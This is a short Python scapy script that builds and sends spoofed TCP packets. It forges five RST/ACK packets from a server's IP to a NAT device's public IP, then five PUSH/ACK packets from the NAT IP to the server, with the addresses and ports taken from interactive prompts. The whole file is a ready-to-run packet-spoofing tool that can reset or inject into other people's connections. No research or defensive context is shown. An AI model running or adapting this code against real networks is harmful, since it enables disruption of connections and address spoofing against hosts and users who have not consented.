from scapy.all import IP, TCP, send
import random


def send_rst_ack(src_ip, dst_ip, src_port):
    print(f"\n[+] Sending 5 spoofed RST/ACK packets from Server's IP {src_ip}:{src_port} to NAT IP {dst_ip}")
    for i in range(5):
        pkt = IP(src=src_ip, dst=dst_ip) / TCP(
            sport=src_port,
            dport=53408, 
            flags="RA",
            seq=random.randint(0, 2**32 - 1)
        )
        send(pkt, iface="eno1", verbose=False)
        print(f"[RST/ACK packet {i+1}] sent")
    print(f"[+] All RST/ACK packets sent.\n")


def send_push_ack(src_ip, dst_ip, dst_port):
    print(f"\n[+] Sending 5 spoofed PUSH/ACK packets from NAT IP {src_ip} to Server's IP {dst_ip}:{dst_port}")
    for i in range(5):
        pkt = IP(src=src_ip, dst=dst_ip) / TCP(
            sport=53408, 
            dport=dst_port,
            flags="PA",
            seq=random.randint(0, 2**32 - 1),
            ack=random.randint(0, 2**32 - 1)
        )
        send(pkt, iface="eno1", verbose=False)
        print(f"[PUSH/ACK packet {i+1}] sent")
    print(f"[+] All PUSH/ACK packets sent.\n")


if __name__ == "__main__":
    print("\n ---- Packet Crafting ----")

    # for RST/ACK Packets
    print(f"\n Send RST/ACK packets (Spoofed packets from the server to the NAT device)")
    src_ip = input(f"\n Enter source IP(server's IP) : ").strip()
    dst_ip = input(f"\n Enter destination IP (NAT device's public IP): ").strip()
    port_choice = input(f"\n Use source port 22 or 80 or 443? (default: 80): ").strip()
    send_rst_ack(src_ip, dst_ip, src_port=int(port_choice) if port_choice else 80)

    # for PUSH/ACK Packets
    print(f"\n Send PUSH/ACK packets (Spoofed packets from the NAT device to the server)")
    nat_ip = input(f"\n Enter NAT device's public IP (source IP): ").strip()
    server_ip = input(f"\n Enter server IP (destination IP): ").strip()
    port_choice2 = input(f"\n Use destination port 22 or 80 or 443? (default: 80): ").strip()
    send_push_ack(nat_ip, server_ip, dst_port=int(port_choice2) if port_choice2 else 80)
